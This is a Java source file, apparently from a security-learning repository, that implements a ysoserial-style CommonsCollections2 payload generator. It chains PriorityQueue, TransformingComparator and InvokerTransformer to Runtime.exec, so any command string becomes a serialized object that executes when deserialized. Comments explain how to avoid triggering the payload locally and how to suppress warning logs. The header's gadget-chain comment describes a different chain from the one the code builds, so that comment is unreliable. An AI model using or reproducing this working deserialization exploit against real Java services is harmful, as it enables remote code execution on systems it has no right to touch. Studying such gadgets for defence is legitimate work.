package com.xjjlearning.hack.java.ysoserial.payloads;

import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Optional;
import java.util.PriorityQueue;

/**
 * created by xjj on 2023/2/8
 */

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
 */
public class CommonsCollections2 {
    // jdk8u71以及之后的版本使用
    public byte[] getPayload(String exp) throws Exception {
        // 假的transformerChain, 后来用反射替换成真的, 原因在于防止本地调试触发计算器
        final ChainedTransformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(2)});

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{exp}
                ),
                new ConstantTransformer(1) // 隐藏告警日志
        };

        TransformingComparator comparator = new TransformingComparator(transformerChain);
        PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
        priorityQueue.offer(1);
        priorityQueue.offer(2); //两个元素执行调整堆大小的操作
        ReflectionUtil.setFieldValue(transformerChain, "iTransformers", transformers);

        Optional<byte[]> b = SerializationUtil.serialize(priorityQueue);
        return b.get();
    }

    private void gadget() throws Exception {
        String exp = "open -a Calculator";
        byte[] payload = getPayload(exp);
        SerializationUtil.deserialize(payload);
    }

    public static void main(String[] args) throws Exception {
        new CommonsCollections2().gadget();
    }
}
